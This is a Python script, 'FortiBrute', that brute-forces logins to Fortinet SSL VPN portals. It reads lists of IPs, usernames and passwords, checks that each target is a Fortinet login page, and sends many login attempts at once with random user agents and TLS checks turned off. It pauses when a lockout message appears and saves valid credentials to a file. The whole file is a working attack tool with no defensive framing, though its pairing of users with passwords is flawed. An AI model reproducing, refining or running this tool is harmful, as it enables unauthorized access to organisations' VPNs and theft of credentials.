import logging
import queue
import random
import sys
import time
import threading
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
from colorama import init, Fore
import requests
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Initialize logging and colorama
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
init(autoreset=True)

class FortiBrute:
    def __init__(self):
        self.domain = ''
        self.ip_list = self.load_ips('ips.txt')
        self.user_list = self.load_users('user.txt')
        self.pass_list = self.load_passwords('pass.txt')
        self.out_file = 'logins.txt'
        self.error_file = 'errors.log'
        self.max_threads = 50
        self.timeout = 10
        self.max_failures = 3
        self.min_sleep = 1
        self.max_sleep = 5
        self.ua = UserAgent()
        self.success_count = 0
        self.failure_count = 0
        self.total_attempts = 0
        self.results_queue = queue.Queue()
        self.logger = logging.getLogger(__name__)
        self.lock = threading.Lock()  # Lock for thread safety
        self.ensure_out_file_exists()

    def ensure_out_file_exists(self):
        """Ensure the output file exists."""
        if not os.path.exists(self.out_file):
            with open(self.out_file, 'w'):
                pass

    def load_ips(self, ip_file):
        """Load IP addresses from a file."""
        try:
            with open(ip_file, 'r') as file:
                return [line.strip().split(':') if ':' in line else (line.strip(), '10443') for line in file if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"Error: IP file '{ip_file}' not found.")
            return []

    def load_users(self, user_file):
        """Load usernames from a file."""
        try:
            with open(user_file, 'r') as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"Error: User file '{user_file}' not found.")
            return []

    def load_passwords(self, pass_file):
        """Load passwords from a file."""
        try:
            with open(pass_file, 'r') as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + f"Error: Password file '{pass_file}' not found.")
            return []

    def create_session(self):
        """Create a session to maintain cookies across requests."""
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        })
        return session

    def logout(self, session, url):
        """Log out from the session."""
        try:
            logout_url = f"{url}/remote/logout"
            response = session.get(logout_url, timeout=self.timeout, verify=False)
            if response.status_code == 200:
                self.logger.info(f"Logged out from {url} successfully.")
            else:
                self.logger.warning(f"Logout failed for {url}. Status code: {response.status_code}")
        except RequestException as e:
            self.logger.warning(f"Logout request failed for {url}: {e}")
        finally:
            session.close()

    def report_success(self, ip, user, pwd, proof):
        """Log and report a successful login attempt."""
        success_msg = f"SUCCESS - IP: {ip}, User: {user}, Password: {pwd}, Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        print(Fore.GREEN + success_msg)

        self.results_queue.put_nowait((success_msg, proof))
        with self.lock:
            self.success_count += 1
            self.total_attempts += 1

    def report_error(self, ip, msg, attempts):
        """Log and report an error during an attempt."""
        error_msg = f"ERROR - IP: {ip}, Message: {msg}, Attempts: {attempts}, Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        print(Fore.RED + error_msg)

        self.logger.error(error_msg)
        with self.lock:
            self.failure_count += 1
            self.total_attempts += 1

    def attempt_login(self, url, user, pwd, ip, attempts):
        """Attempt to log in with provided credentials."""
        data = {
            'ajax': '1',
            'username': user,
            'credential': pwd,
            'realm': self.domain if self.domain else ''
        }

        session = self.create_session()
        session.headers.update({'User-Agent': self.ua.random})

        try:
            login_url = f"{url}/remote/logincheck"
            self.logger.debug(f"Attempting login to {login_url} with user: {user} and password: {pwd}")
            response = session.post(login_url, data=data, timeout=self.timeout, verify=False)

            if response.status_code == 200:
                if 'Too many bad login attempts' in response.text:
                    self.report_error(ip, f"Too many attempts. Sleeping for {random.uniform(self.min_sleep, self.max_sleep)} seconds.", attempts)
                    time.sleep(random.uniform(self.min_sleep, self.max_sleep))
                    return 'too_many_attempts'
                elif 'Invalid username or password' in response.text:
                    self.logger.info(f"Invalid credentials for {ip} with user {user}.")
                    return 'invalid_credentials'
                elif 'ssl_vpn_permission_denied' in response.text.lower():
                    self.logout(session, url)
                    self.report_error(ip, "Permission denied.", attempts)
                    return 'permission_denied'
                elif 'fortinet' in response.text.lower() and 'remote/logincheck' in response.text.lower():
                    self.logout(session, url)
                    self.report_success(ip, user, pwd, response.text)
                    return 'success'
                else:
                    self.report_error(ip, "Unexpected response.", attempts)
                    return 'unexpected_response'
            else:
                self.report_error(ip, f"Unexpected status code: {response.status_code}. Attempts: {attempts}", attempts)
        except RequestException as e:
            self.report_error(ip, f"Login error: {e}. Attempts: {attempts}", attempts)
            return 'login_error'
        finally:
            session.close()

        return 'abort'

    def process_ip(self, ip_info):
        """Process a single IP with the given username-password combinations."""
        ip, port = ip_info
        base_url = f"https://{ip}:{port}"
        self.logger.debug(f"Processing IP: {ip} with port: {port}")

        if not self.check_connection(base_url):
            self.report_error(ip, "Connection failed.", 0)
            return

        if not self.is_forti_ssl_vpn(base_url):
            self.report_error(ip, "Not a Fortinet SSL VPN.", 0)
            return

        combined_credentials = [(user, pwd) for user in self.user_list for pwd in self.pass_list]
        max_attempts = len(combined_credentials)

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.attempt_login, base_url, user, pwd, ip, attempts) for user, pwd, attempts in zip(self.user_list, self.pass_list, range(max_attempts))]
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result == 'success':
                        return
                    elif result in ['abort', 'login_error', 'unexpected_response']:
                        with self.lock:
                            self.failure_count += 1
                            self.total_attempts += 1
                except Exception as e:
                    self.logger.error(f"Error during task: {e}")

        if self.total_attempts >= max_attempts:
            self.report_error(ip, "Failed to log in after attempting all credentials.", self.total_attempts)

    def check_connection(self, url):
        """Check if the connection to the URL is valid."""
        try:
            response = requests.get(url, timeout=self.timeout, verify=False)
            return response.status_code == 200
        except RequestException:
            return False

    def is_forti_ssl_vpn(self, url):
        """Check if the target is a Fortinet SSL VPN."""
        try:
            login_url = f"{url}/remote/logincheck"
            response = requests.get(login_url, timeout=self.timeout, verify=False)
            return 'fortinet' in response.text.lower() and 'remote/logincheck' in response.text.lower()
        except RequestException:
            return False

    def run(self):
        """Main method to execute the brute force."""
        if not self.ip_list or not self.user_list or not self.pass_list:
            print(Fore.RED + "Error: No IPs, users, or passwords provided.")
            return

        # Start a thread to save results every 3 minutes
        save_results_thread = threading.Thread(target=self.save_results_periodically, daemon=True)
        save_results_thread.start()

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.process_ip, ip_info) for ip_info in self.ip_list]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.logger.error(f"Error during task: {e}")

        # Save final results
        self.save_results()

        print(Fore.YELLOW + "\nSummary Report:")
        print(Fore.GREEN + f"Total Successful Logins: {self.success_count}")
        print(f"Total Attempts: {self.total_attempts}")
        print(f"Total Failed Attempts: {self.failure_count}")

    def save_results(self):
        """Save the results to the output file."""
        while not self.results_queue.empty():
            result, proof = self.results_queue.get_nowait()
            with open(self.out_file, 'a') as file:
                file.write(f"{result}\nProof: {proof}\n")

    def save_results_periodically(self):
        """Periodically save results every 3 minutes."""
        while True:
            time.sleep(180)  # 3 minutes
            self.save_results()

if __name__ == "__main__":
    brute_forcer = FortiBrute()
    brute_forcer.run()
